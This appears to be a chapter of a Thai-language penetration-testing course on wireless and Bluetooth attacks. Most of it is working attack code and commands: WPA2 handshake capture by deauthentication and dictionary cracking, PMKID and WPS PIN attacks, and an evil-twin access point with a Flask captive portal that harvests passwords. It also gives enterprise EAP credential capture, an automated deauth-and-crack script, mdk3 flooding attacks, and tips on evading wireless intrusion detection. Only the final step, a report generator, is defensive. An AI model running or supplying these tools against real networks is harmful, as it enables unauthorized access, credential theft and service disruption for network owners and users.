# Part 32: Wireless Security Testing (Steps 311-320)

## Step 311: Wireless Fundamentals & Setup

การตั้งค่า wireless adapter และเข้าใจพื้นฐานการทดสอบความปลอดภัย wireless

```bash
#!/bin/bash
# wireless_setup.sh

# ============================================
# Wireless Adapter Setup
# ============================================

# ตรวจสอบ wireless adapters
ifconfig
iwconfig
iw list

# ดูรายละเอียด adapter
lsusb | grep -i wireless
lspci | grep -i wireless
dmesg | grep -i "wireless\|wifi\|80211"

# ตรวจสอบ driver
modinfo iwlwifi 2>/dev/null
modinfo rtl8812au 2>/dev/null  # Popular external adapter

# ============================================
# Monitor Mode Setup
# ============================================

# เช็ค adapter name
WIFI_IFACE="wlan0"

# Method 1: airmon-ng
airmon-ng start $WIFI_IFACE
# Creates wlan0mon or mon0

# Kill interfering processes
airmon-ng check kill

# Method 2: Manual
ip link set $WIFI_IFACE down
iw dev $WIFI_IFACE set type monitor
ip link set $WIFI_IFACE up
iw dev $WIFI_IFACE info

# Method 3: iwconfig
ifconfig $WIFI_IFACE down
iwconfig $WIFI_IFACE mode monitor
ifconfig $WIFI_IFACE up

# Verify monitor mode
iwconfig wlan0mon 2>/dev/null || iwconfig wlan0

# ============================================
# Channel Hopping / Fix Channel
# ============================================

# Set specific channel
iw dev wlan0mon set channel 6

# 5GHz channels
iw dev wlan0mon set channel 36
iw dev wlan0mon set channel 100

# Channel hopping with airodump
airodump-ng wlan0mon  # Automatically hops

# Capture specific channel
airodump-ng --channel 6 wlan0mon

# ============================================
# Disable Monitor Mode
# ============================================
airmon-ng stop wlan0mon
ip link set wlan0 down
iw dev wlan0 set type managed
ip link set wlan0 up
service NetworkManager restart
```

## Step 312: Network Discovery & Scanning

```bash
#!/bin/bash
# wireless_discovery.sh

MON_IFACE="wlan0mon"

# ============================================
# Basic Wireless Scanning
# ============================================

# Scan all networks
airodump-ng $MON_IFACE

# Output fields:
# BSSID - Access Point MAC
# PWR - Signal strength
# Beacons - Beacon frames count
# Data - Data frames count
# MB - Max speed supported
# ENC - Encryption (OPN/WEP/WPA/WPA2)
# CIPHER - TKIP/CCMP
# AUTH - SKA/PSK/MGT
# ESSID - Network name

# ============================================
# Target Specific Network
# ============================================

# Save capture file
airodump-ng --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write /tmp/capture \
    $MON_IFACE

# Output: /tmp/capture-01.cap, /tmp/capture-01.csv

# ============================================
# 5GHz Scanning
# ============================================
airodump-ng --band a $MON_IFACE  # 5GHz only
airodump-ng --band abg $MON_IFACE  # Both 2.4GHz and 5GHz

# ============================================
# Wireless Tools
# ============================================

# iw scan
iw dev wlan0 scan | grep -E 'SSID|signal|freq|capability'

# nmcli
nmcli dev wifi list

# wash - WPS-enabled APs
wash -i $MON_IFACE
# Output: BSSID, Channel, RSSI, WPS Version, WPS Locked

# ============================================
# Wireshark Capture
# ============================================
echo "Start Wireshark on monitor interface:"
echo "  wireshark -i $MON_IFACE -k"
echo "  Or: wireshark -i $MON_IFACE -f 'wlan type mgt' -k"

# tcpdump
tcpdump -i $MON_IFACE -w /tmp/wireless_capture.pcap

# ============================================
# Parse Capture with Scapy
# ============================================
python3 << 'EOF'
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt

networks = {}

def parse_beacon(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        # Get SSID
        if pkt.haslayer(Dot11Elt):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore')
        # Get channel from DS element
        channel = None
        elt = pkt[Dot11Elt]
        while elt:
            if elt.ID == 3:  # DS Parameter Set
                channel = int.from_bytes(elt.info, 'big')
            try:
                elt = elt.payload[Dot11Elt]
            except:
                break
        
        if bssid not in networks:
            networks[bssid] = {'ssid': ssid, 'channel': channel}
            print(f"[+] {bssid} | Ch:{channel:2} | {ssid}")

sniff(iface="wlan0mon", prn=parse_beacon, count=100)
EOF
```

## Step 313: WPA2-PSK Cracking

```bash
#!/bin/bash
# wpa2_cracking.sh

BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL=6
CLIENT="11:22:33:44:55:66"
MON="wlan0mon"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# ============================================
# Step 1: Capture WPA Handshake
# ============================================
echo "[*] Step 1: Capture WPA handshake"

# Start capture
airodump-ng --bssid $BSSID \
    --channel $CHANNEL \
    --write /tmp/wpa_capture \
    $MON &
CAPTURE_PID=$!

# Wait a bit for capture to start
sleep 3

# ============================================
# Step 2: Deauthentication Attack
# ============================================
echo "[*] Step 2: Deauth attack to force handshake"

# Deauth specific client
aireplay-ng --deauth 10 \
    -a $BSSID \
    -c $CLIENT \
    $MON

# Broadcast deauth (all clients)
aireplay-ng --deauth 10 \
    -a $BSSID \
    $MON

# Wait for handshake
echo "[*] Waiting for handshake capture..."
sleep 5
kill $CAPTURE_PID 2>/dev/null

# ============================================
# Step 3: Verify Handshake
# ============================================
echo "[*] Step 3: Verify handshake"
aircrack-ng /tmp/wpa_capture-01.cap
# Look for "1 handshake" in output

# Alternative verification
wpaclean /tmp/clean.cap /tmp/wpa_capture-01.cap
cowpatty -r /tmp/wpa_capture-01.cap -s "NETWORK_NAME" -f /dev/null 2>&1 | grep -i "four-way"

# ============================================
# Step 4: Crack with Aircrack-ng
# ============================================
echo "[*] Step 4: Crack WPA handshake"

# Dictionary attack
aircrack-ng -w $WORDLIST \
    -b $BSSID \
    /tmp/wpa_capture-01.cap

# Multiple wordlists
cat /tmp/wordlist1.txt /tmp/wordlist2.txt | \
    aircrack-ng -w - -b $BSSID /tmp/wpa_capture-01.cap

# ============================================
# Step 5: Crack with Hashcat (faster)
# ============================================
echo "[*] Step 5: Convert to hashcat format"

# Convert .cap to hashcat format
hcxpcapngtool -o /tmp/wifi.hc22000 /tmp/wpa_capture-01.cap
# Or older format:
hcxtools -c /tmp/wpa_capture-01.cap -o /tmp/wifi.hccapx

# Crack with hashcat
hashcat -m 22000 /tmp/wifi.hc22000 $WORDLIST \
    -r /usr/share/hashcat/rules/best64.rule \
    -o cracked_wifi.txt --force

# Show result
hashcat -m 22000 /tmp/wifi.hc22000 --show

# ============================================
# PMKID Attack (no need for connected client!)
# ============================================
echo "[*] PMKID Attack - No client needed"

# hcxdumptool captures PMKID from AP directly
hcxdumptool -i $MON \
    --filtermode=2 \
    -o /tmp/pmkid_capture.pcapng \
    --enable_status=1

# Convert and crack
hcxpcapngtool -o /tmp/pmkid.hc22000 /tmp/pmkid_capture.pcapng
hashcat -m 22000 /tmp/pmkid.hc22000 $WORDLIST --force

echo "[+] WPA2 cracking complete"
```

## Step 314: WPS Attack

```bash
#!/bin/bash
# wps_attack.sh

MON="wlan0mon"
BSSID="AA:BB:CC:DD:EE:FF"

# ============================================
# WPS PIN Brute Force - Reaver
# ============================================
echo "[*] WPS attacks require WPS-enabled AP"

# Scan for WPS-enabled APs
wash -i $MON -C  # -C ignore FCS errors

# Reaver brute force WPS PIN
reaver -i $MON \
    -b $BSSID \
    -vv \
    -d 1 \
    -t 5 \
    -N
    # -d delay between attempts
    # -t timeout
    # -N no auto reconnect

# Reaver with specific options
reaver -i $MON \
    -b $BSSID \
    -vv \
    -d 5 \
    -t 10 \
    --no-nacks \
    -x 60  # retry after 60s lockout

# ============================================
# Bully (alternative to Reaver)
# ============================================
bully -b $BSSID \
    -c 6 \
    -d \
    -v 3 \
    $MON

# ============================================
# Pixie Dust Attack (faster WPS crack)
# ============================================
# Works against vulnerable Ralink/Broadcom/Realtek chipsets

# Reaver with pixie-dust
reaver -i $MON \
    -b $BSSID \
    -K 1 \
    -vv
    # -K 1 = pixiedust attack

# Pixiewps standalone tool
# Used with collected Pixie Dust data from Reaver

# ============================================
# WPS Status
# ============================================
# WPS Locked (LOCKED) = too many failed attempts
# Need to wait or find another AP

# Check WPS details
iw dev wlan0 scan | grep -A 20 "$BSSID" | grep -i wps

echo "[*] WPS attack notes:"
echo "  - WPS enabled: check with wash"
echo "  - Pixie Dust works on specific chipsets"
echo "  - WPS lockout may occur after ~3-11 attempts"
echo "  - Modern APs disable WPS or rate-limit it"
```

## Step 315: Evil Twin & Rogue AP

```python
#!/usr/bin/env python3
# evil_twin_setup.py

EVIL_TWIN_SETUP = """
=== Evil Twin Attack Setup ===

Tools needed: hostapd, dnsmasq, iptables

=== Step 1: Create Hostapd Config ===

cat > /tmp/hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

=== Step 2: Setup DHCP with dnsmasq ===

cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
listen-address=192.168.1.1
bind-interfaces
# Captive portal redirect
address=/#/192.168.1.1
EOF

=== Step 3: Configure Network ===

# Set IP on wlan0
ifconfig wlan0 192.168.1.1 netmask 255.255.255.0 up

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# NAT (if providing real internet)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i wlan0 -j ACCEPT

# Redirect all HTTP to captive portal
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to 192.168.1.1:80
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j DNAT --to 192.168.1.1:443

=== Step 4: Start Services ===

hostapd /tmp/hostapd.conf &
dnsmasq -C /tmp/dnsmasq.conf &
"""

CAPTIVE_PORTAL = '''
#!/usr/bin/env python3
# captive_portal.py - Simple credential harvester

from flask import Flask, request, redirect, render_template_string
import json
import datetime

app = Flask(__name__)
captured_creds = []

LOGIN_PAGE = """
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<div style="text-align:center; margin-top:100px;">
  <h2>WiFi Authentication Required</h2>
  <p>Please enter your credentials to connect</p>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username"><br><br>
    <input type="password" name="password" placeholder="Password"><br><br>
    <input type="submit" value="Connect">
  </form>
</div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return render_template_string(LOGIN_PAGE)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    client_ip = request.remote_addr
    
    cred = {
        "timestamp": str(datetime.datetime.now()),
        "ip": client_ip,
        "username": username,
        "password": password
    }
    captured_creds.append(cred)
    
    print(f"[+] Captured: {username}:{password} from {client_ip}")
    
    with open("/tmp/captured_creds.json", "w") as f:
        json.dump(captured_creds, f, indent=2)
    
    return "<h2>Authentication successful. Connecting...</h2>"

@app.route("/creds")
def view_creds():
    return json.dumps(captured_creds, indent=2)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
'''

print(EVIL_TWIN_SETUP)
print("\n=== Captive Portal Code ===")
print(CAPTIVE_PORTAL)

print("""
=== Automated Evil Twin with hostapd-wpe ===
# hostapd-wpe captures WPA Enterprise credentials
# Configure hostapd-wpe.conf for your target SSID
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
""")
```

## Step 316: WPA Enterprise / EAP Attacks

```bash
#!/bin/bash
# wpa_enterprise_attack.sh

echo "=== WPA Enterprise / EAP Attacks ==="

# WPA Enterprise uses 802.1X authentication with EAP
# Types: PEAP, EAP-TTLS, EAP-TLS, LEAP

# ============================================
# EAPHammer - WPA Enterprise Attack
# ============================================
# git clone https://github.com/s0lst1c3/eaphammer
# cd eaphammer && ./kali-setup

# Generate fake certificates
python3 eaphammer --cert-wizard

# PEAP/MSCHAPv2 Attack
python3 eaphammer -i wlan0 \
    --ssid "CorpWiFi" \
    --auth peap \
    --creds

# EAP-TTLS Attack
python3 eaphammer -i wlan0 \
    --ssid "CorpWiFi" \
    --auth ttls \
    --creds

# GTC Downgrade Attack (captures plaintext password!)
python3 eaphammer -i wlan0 \
    --ssid "CorpWiFi" \
    --auth gtc-downgrade \
    --creds

# ============================================
# hostapd-wpe (simpler alternative)
# ============================================
cat > /tmp/hostapd-wpe.conf << 'EOF'
interface=wlan0
ssid=CorpWiFi
channel=6
hw_mode=g
ieee8021x=1
authentication_server_addr=127.0.0.1
authentication_server_port=1812
authentication_server_shared_secret=hostapd
eap_server=1
eap_user_file=/etc/hostapd/hostapd.eap_user
ca_cert=/etc/hostapd/ca.pem
server_cert=/etc/hostapd/server.pem
private_key=/etc/hostapd/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd/dh
EOF

hostapd-wpe /tmp/hostapd-wpe.conf

# ============================================
# Crack PEAP/MSCHAPv2 Challenge-Response
# ============================================
# After capturing challenge/response:
asleap -C <challenge> -R <response> -W /usr/share/wordlists/rockyou.txt
john --format=netntlm /tmp/captured_creds.txt
hashcat -m 5500 /tmp/captured_creds.txt /usr/share/wordlists/rockyou.txt  # NTLMv1
hashcat -m 5600 /tmp/captured_creds.txt /usr/share/wordlists/rockyou.txt  # NTLMv2

# ============================================
# LEAP Attack (Cisco Lightweight EAP)
# ============================================
# LEAP is vulnerable to dictionary attacks
asleap -r /tmp/leap_capture.pcap -W /usr/share/wordlists/rockyou.txt

# ============================================
# Karma Attack
# ============================================
# Respond to all probe requests as any network
echo "[*] Karma - respond to all probes"
cat >> /tmp/hostapd.conf << 'EOF'
# Enable karma
karma=1
EOF

echo "[+] WPA Enterprise attacks setup complete"
echo "[*] Captured credentials saved to /tmp/eaphammer.log"
```

## Step 317: Bluetooth Security Testing

```python
#!/usr/bin/env python3
# bluetooth_security.py

import subprocess
from typing import List, Dict

class BluetoothTester:
    def scan_devices(self, duration: int = 10) -> List[Dict]:
        """สแกนหาอุปกรณ์ Bluetooth"""
        print(f"[*] Scanning Bluetooth for {duration}s...")
        result = subprocess.run(
            ['hcitool', 'scan', '--flush'],
            capture_output=True, text=True, timeout=duration + 5
        )
        
        devices = []
        for line in result.stdout.split('\n')[1:]:
            if '\t' in line:
                parts = line.strip().split('\t')
                if len(parts) >= 2:
                    devices.append({'address': parts[0], 'name': parts[1]})
        
        return devices
    
    def le_scan(self, duration: int = 10):
        """สแกน BLE (Bluetooth Low Energy) devices"""
        print(f"[*] BLE scan for {duration}s")
        result = subprocess.run(
            ['hcitool', 'lescan', '--duplicates'],
            capture_output=True, text=True, timeout=duration + 3
        )
        return result.stdout
    
    def get_device_info(self, address: str) -> str:
        """รับข้อมูลของ device"""
        result = subprocess.run(
            ['hcitool', 'info', address],
            capture_output=True, text=True
        )
        return result.stdout
    
    def sdp_browse(self, address: str) -> str:
        """ส่อง SDP services"""
        result = subprocess.run(
            ['sdptool', 'browse', address],
            capture_output=True, text=True
        )
        return result.stdout
    
    def rfcomm_connect(self, address: str, channel: int = 1):
        """เชื่อมต่อ RFCOMM (serial over bluetooth)"""
        cmd = f"rfcomm connect 0 {address} {channel}"
        print(f"[*] Connecting: {cmd}")
        return cmd
    
    def btlejack_commands(self) -> dict:
        """คำสั่ง BTLEJack สำหรับ BLE hijacking"""
        return {
            'scan': 'btlejack -s',
            'sniff_new': 'btlejack -c any -s',
            'sniff_existing': 'btlejack -c 0x12345678 -m 0xFFFFFF',
            'follow': 'btlejack -c 0x12345678 -f',
            'jam': 'btlejack -c 0x12345678 -j',
        }
    
    def bettercap_ble(self) -> str:
        """ใช้ bettercap สำหรับ BLE testing"""
        return """
=== Bettercap BLE Commands ===
bettercap
# In bettercap console:
ble.recon on               # Start BLE recon
ble.show                   # Show discovered devices
ble.enum AA:BB:CC:DD:EE:FF # Enumerate device services/chars
ble.write AA:BB:CC:DD:EE:FF 0x0025 DEADBEEF  # Write to characteristic
ble.sniff AA:BB:CC:DD:EE:FF  # Sniff connection
"""
    
    def bluez_commands(self) -> list:
        """คำสั่ง bluetoothctl"""
        return [
            'bluetoothctl',
            'power on',
            'agent on',
            'scan on',
            'devices',
            'info AA:BB:CC:DD:EE:FF',
            'pair AA:BB:CC:DD:EE:FF',
            'trust AA:BB:CC:DD:EE:FF',
            'connect AA:BB:CC:DD:EE:FF',
        ]
    
    def blueborne_check(self, target_ip: str) -> str:
        """BlueBorne vulnerability check"""
        # BlueBorne affects Linux, Android, Windows, iOS
        return f"""
=== BlueBorne Check ===
# Use BlueBorne scanner
python3 blueborne_scanner.py -a {target_ip}

# Or use nmap
nmap -p 17-19 --script bluetooth-info {target_ip}
"""

# เครื่องมือทดสอบ Bluetooth
print("=== Bluetooth Security Testing Tools ===")
print("")
print("Discovery:")
print("  hcitool scan         - Classic BT scan")
print("  hcitool lescan       - BLE scan")
print("  btscanner            - Detailed device scanner")
print("  bettercap ble.recon  - BLE reconnaissance")
print("")
print("Exploitation:")
print("  btlejack             - BLE hijacking")
print("  bluesnarfer          - OBEX data theft")
print("  btlejack             - BLE MITM")
print("  bluepot              - Honeypot")
print("")
print("Analysis:")
print("  wireshark + btsnoop  - Capture BT traffic")
print("  ubertooth            - Hardware sniffer")
print("  frontline            - Protocol analyzer")

tester = BluetoothTester()
print("\n" + tester.bettercap_ble())
```

## Step 318: Wireless Attack Automation

```python
#!/usr/bin/env python3
# wireless_automation.py

import subprocess
import time
import os
import re
from typing import List, Dict

class WirelessPentestAutomator:
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
        self.mon_interface = None
        self.networks = []
    
    def enable_monitor_mode(self) -> str:
        """Enable monitor mode on adapter"""
        subprocess.run(['airmon-ng', 'check', 'kill'], capture_output=True)
        result = subprocess.run(
            ['airmon-ng', 'start', self.interface],
            capture_output=True, text=True
        )
        # Find monitor interface name
        if 'wlan0mon' in result.stdout:
            self.mon_interface = 'wlan0mon'
        elif 'mon0' in result.stdout:
            self.mon_interface = 'mon0'
        else:
            self.mon_interface = f"{self.interface}mon"
        print(f"[+] Monitor mode: {self.mon_interface}")
        return self.mon_interface
    
    def scan_networks(self, duration: int = 30) -> List[Dict]:
        """Scan for networks and return list"""
        if not self.mon_interface:
            self.enable_monitor_mode()
        
        print(f"[*] Scanning for {duration}s...")
        
        # Run airodump-ng
        proc = subprocess.Popen(
            ['airodump-ng', '--write', '/tmp/scan', '--output-format', 'csv', self.mon_interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(duration)
        proc.terminate()
        
        # Parse CSV output
        networks = self._parse_airodump_csv('/tmp/scan-01.csv')
        self.networks = networks
        return networks
    
    def _parse_airodump_csv(self, csv_file: str) -> List[Dict]:
        """Parse airodump CSV output"""
        networks = []
        try:
            with open(csv_file, 'r', errors='ignore') as f:
                lines = f.readlines()
            
            in_networks = False
            for line in lines:
                if 'BSSID' in line and 'ESSID' in line:
                    in_networks = True
                    continue
                if in_networks and line.strip():
                    parts = [p.strip() for p in line.split(',')]
                    if len(parts) >= 14 and ':' in parts[0]:
                        networks.append({
                            'bssid': parts[0],
                            'first_seen': parts[1],
                            'last_seen': parts[2],
                            'channel': parts[3],
                            'speed': parts[4],
                            'privacy': parts[5],
                            'cipher': parts[6],
                            'authentication': parts[7],
                            'power': parts[8],
                            'beacons': parts[9],
                            'iv': parts[10],
                            'essid': parts[13]
                        })
        except FileNotFoundError:
            pass
        return networks
    
    def auto_capture_handshakes(self, target_essid: str = None) -> List[str]:
        """Auto capture WPA handshakes from discovered networks"""
        captured = []
        
        targets = self.networks
        if target_essid:
            targets = [n for n in self.networks if target_essid.lower() in n['essid'].lower()]
        
        for network in targets[:3]:  # Limit to 3 networks
            bssid = network['bssid']
            channel = network['channel']
            essid = network['essid']
            
            if 'WPA' not in network.get('privacy', ''):
                print(f"[-] Skipping {essid} (not WPA)")
                continue
            
            print(f"[*] Targeting: {essid} ({bssid}) on ch{channel}")
            
            capture_file = f"/tmp/hs_{bssid.replace(':', '')}"
            
            # Start capture
            proc = subprocess.Popen(
                ['airodump-ng', '--bssid', bssid, '--channel', channel,
                 '--write', capture_file, self.mon_interface],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            
            time.sleep(2)
            
            # Deauth attack
            subprocess.run(
                ['aireplay-ng', '--deauth', '5', '-a', bssid, self.mon_interface],
                capture_output=True
            )
            
            time.sleep(5)
            proc.terminate()
            
            # Check if handshake was captured
            if os.path.exists(f"{capture_file}-01.cap"):
                check = subprocess.run(
                    ['aircrack-ng', f"{capture_file}-01.cap"],
                    capture_output=True, text=True
                )
                if '1 handshake' in check.stdout:
                    captured.append(f"{capture_file}-01.cap")
                    print(f"[+] Handshake captured for {essid}")
        
        return captured
    
    def crack_all_captures(self, capture_files: List[str], wordlist: str = '/usr/share/wordlists/rockyou.txt'):
        """Crack all captured handshakes"""
        for cap_file in capture_files:
            print(f"[*] Cracking: {cap_file}")
            result = subprocess.run(
                ['aircrack-ng', '-w', wordlist, cap_file],
                capture_output=True, text=True
            )
            # Extract cracked key
            key_match = re.search(r'KEY FOUND!.*?\[ (.+?) \]', result.stdout)
            if key_match:
                print(f"[+] Key found: {key_match.group(1)}")
            else:
                print(f"[-] Not in wordlist")

# Demonstration
print("=== Wireless Pentest Automator ===")
print("Usage:")
print("  automator = WirelessPentestAutomator('wlan0')")
print("  automator.enable_monitor_mode()")
print("  networks = automator.scan_networks(30)")
print("  captures = automator.auto_capture_handshakes()")
print("  automator.crack_all_captures(captures)")
```

## Step 319: Wireless Protocols Security

```python
#!/usr/bin/env python3
# wireless_protocols_security.py

WIRELESS_PROTOCOLS_ANALYSIS = """
=== Wireless Protocol Security Analysis ===

1. WEP (Wired Equivalent Privacy)
   - Broken: RC4 IV reuse vulnerability
   - Attack: ARP replay + aircrack (requires 50K-100K IVs)
   - Tool: aircrack-ng -x (brute), aircrack-ng -w (dict)
   - Time to crack: <1 minute with sufficient IVs
   Status: COMPLETELY BROKEN - Do not use

2. WPA (Wi-Fi Protected Access)
   - TKIP encryption (improved WEP)
   - Vulnerable to TKIP MIC attack
   - PSK vulnerable to dictionary attacks
   Status: Deprecated

3. WPA2
   - AES-CCMP encryption
   - PSK mode: vulnerable to offline dictionary attack
   - Enterprise: requires 802.1X server
   - KRACK vulnerability (2017) - patched
   Status: Still common, secure with strong password

4. WPA3
   - SAE (Simultaneous Authentication of Equals)
   - Dragonfly handshake
   - DragonBlood vulnerabilities (2019)
   - Forward secrecy
   Status: Current standard

5. WPS (Wi-Fi Protected Setup)
   - 8-digit PIN (11,000 combinations)
   - Pixie Dust: offline attack on seed
   - Lock bypass on some devices
   Status: VULNERABLE - Disable if possible

6. 802.11 Management Frame Attacks
   - Deauthentication frames are unauthenticated
   - Solution: 802.11w (Management Frame Protection)
   Attacks:
   - Deauth DoS: aireplay-ng --deauth
   - Disassociation flood
   - Beacon flood: mdk3 b
   - Authentication flood: mdk3 a
"""

MDK3_ATTACKS = """
=== MDK3 Wireless DoS Attacks ===
# apt install mdk3

# Beacon flood - create many fake APs
mdk3 wlan0mon b -n "FakeAP" -c 6 -s 1000

# Authentication DoS - flood AP with auth requests
mdk3 wlan0mon a -a AA:BB:CC:DD:EE:FF

# Deauthentication flood
mdk3 wlan0mon d -c 6 -b /tmp/blacklist.txt

# SSID brute force (probe response)
mdk3 wlan0mon p -f /tmp/ssid_list.txt -t AA:BB:CC:DD:EE:FF

# Disconnect all clients from AP
mdk3 wlan0mon d -b <(echo AA:BB:CC:DD:EE:FF) -c 6
"""

print(WIRELESS_PROTOCOLS_ANALYSIS)
print(MDK3_ATTACKS)

# Wireless IDS Evasion
print("""
=== Wireless IDS Evasion ===

# Use random MAC address
macchanger -r wlan0
macchanger --mac=AA:BB:CC:DD:EE:FF wlan0

# Limit transmit power (avoid detection by signal strength)
iw dev wlan0 set txpower fixed 6  # 6dBm

# Slow scan (avoid anomaly detection)
airodump-ng --write-interval 5 wlan0mon

# Multiple adapter rotation
# Use different adapter for each attack phase

# Time-based attacks (after hours)
# Monitor WIDS logs - attack when IDS is unmanned
""")
```

## Step 320: Wireless Security Assessment Report

```python
#!/usr/bin/env python3
# wireless_assessment_report.py

import json
from datetime import datetime
from typing import List, Dict

class WirelessAssessmentReport:
    def __init__(self, org_name: str, assessor: str):
        self.org_name = org_name
        self.assessor = assessor
        self.date = datetime.now().strftime('%Y-%m-%d')
        self.findings = []
        self.networks = []
    
    def add_network(self, network_info: Dict):
        """เพิ่ม network ที่พบ"""
        self.networks.append(network_info)
    
    def add_finding(self, title: str, severity: str, description: str,
                    affected: str, recommendation: str):
        """เพิ่ม finding"""
        self.findings.append({
            'title': title,
            'severity': severity,
            'description': description,
            'affected': affected,
            'recommendation': recommendation
        })
    
    def assess_network_security(self, network: Dict) -> List[Dict]:
        """ประเมิน security ของ network"""
        findings = []
        
        if network.get('encryption') in ['OPN', 'OPEN', None]:
            findings.append({
                'title': 'Open Wireless Network',
                'severity': 'CRITICAL',
                'description': f"Network '{network.get('ssid')}' has no encryption",
                'affected': network.get('bssid'),
                'recommendation': 'Enable WPA2-AES encryption with strong password'
            })
        
        if network.get('encryption') == 'WEP':
            findings.append({
                'title': 'WEP Encryption Detected',
                'severity': 'CRITICAL',
                'description': 'WEP can be cracked in minutes',
                'affected': network.get('bssid'),
                'recommendation': 'Upgrade to WPA2 or WPA3 immediately'
            })
        
        if network.get('wps_enabled'):
            findings.append({
                'title': 'WPS Enabled',
                'severity': 'HIGH',
                'description': 'WPS vulnerable to PIN brute-force and Pixie Dust',
                'affected': network.get('bssid'),
                'recommendation': 'Disable WPS'
            })
        
        if network.get('pmf_enabled') == False:
            findings.append({
                'title': '802.11w Not Enabled',
                'severity': 'MEDIUM',
                'description': 'Management frames unprotected, deauth attacks possible',
                'affected': network.get('bssid'),
                'recommendation': 'Enable 802.11w (Management Frame Protection)'
            })
        
        return findings
    
    def generate_markdown_report(self) -> str:
        """สร้างรายงาน Markdown"""
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3, 'INFO': 4}
        sorted_findings = sorted(self.findings, key=lambda x: severity_order.get(x['severity'], 5))
        
        report = f"""# Wireless Security Assessment Report
**Organization:** {self.org_name}
**Date:** {self.date}
**Assessor:** {self.assessor}

---

## Executive Summary

A wireless security assessment was conducted against {self.org_name}'s 
wireless infrastructure. This report documents findings and recommendations.

**Networks Discovered:** {len(self.networks)}
**Total Findings:** {len(self.findings)}
**Critical:** {sum(1 for f in self.findings if f['severity'] == 'CRITICAL')}
**High:** {sum(1 for f in self.findings if f['severity'] == 'HIGH')}
**Medium:** {sum(1 for f in self.findings if f['severity'] == 'MEDIUM')}
**Low:** {sum(1 for f in self.findings if f['severity'] == 'LOW')}

---

## Networks Discovered

| SSID | BSSID | Channel | Encryption | WPS | Signal |
|------|-------|---------|------------|-----|--------|
"""
        for net in self.networks:
            report += f"| {net.get('ssid','?')} | {net.get('bssid','?')} | {net.get('channel','?')} | {net.get('encryption','?')} | {'Yes' if net.get('wps_enabled') else 'No'} | {net.get('signal','?')} |\n"
        
        report += "\n---\n\n## Detailed Findings\n\n"
        
        for i, finding in enumerate(sorted_findings, 1):
            report += f"""### {i}. {finding['title']}

**Severity:** {finding['severity']}
**Affected:** {finding['affected']}

**Description:**
{finding['description']}

**Recommendation:**
{finding['recommendation']}

---
"""
        
        report += """
## Remediation Priorities

1. **Immediate Actions:**
   - Disable all open networks
   - Upgrade WEP to WPA2/WPA3
   - Disable WPS on all APs

2. **Short-term (30 days):**
   - Enable 802.11w (MFP) on all APs
   - Implement WPA2-Enterprise for corporate networks
   - Deploy Wireless IDS/IPS

3. **Long-term:**
   - Migrate to WPA3 where possible
   - Regular wireless security assessments
   - Guest network segmentation
   - Wireless traffic monitoring
"""
        return report

# Demo
report = WirelessAssessmentReport('ACME Corporation', 'Security Team')

# Add sample networks
report.add_network({'ssid': 'CorpWiFi', 'bssid': 'AA:BB:CC:DD:EE:01', 
                    'channel': 6, 'encryption': 'WPA2', 
                    'wps_enabled': True, 'pmf_enabled': False, 'signal': -65})
report.add_network({'ssid': 'GuestWiFi', 'bssid': 'AA:BB:CC:DD:EE:02',
                    'channel': 11, 'encryption': 'OPN',
                    'wps_enabled': False, 'pmf_enabled': False, 'signal': -70})

# Add findings
report.add_finding(
    'Open Guest Network',
    'CRITICAL',
    'GuestWiFi network has no encryption. Traffic is visible to anyone.',
    'GuestWiFi (AA:BB:CC:DD:EE:02)',
    'Enable WPA2-AES with captive portal for guest access'
)
report.add_finding(
    'WPS Enabled on Corporate AP',
    'HIGH',
    'CorpWiFi has WPS enabled, vulnerable to PIN attack',
    'CorpWiFi (AA:BB:CC:DD:EE:01)',
    'Disable WPS in AP settings'
)

print(report.generate_markdown_report())
```

---
*Part 32 เสร็จสมบูรณ์ - Steps 311-320 ครอบคลุม Wireless Setup, Network Discovery, WPA2-PSK Cracking, WPS Attack, Evil Twin/Rogue AP, WPA Enterprise/EAP Attacks, Bluetooth Security, Wireless Automation, Protocol Security และ Wireless Assessment Report*
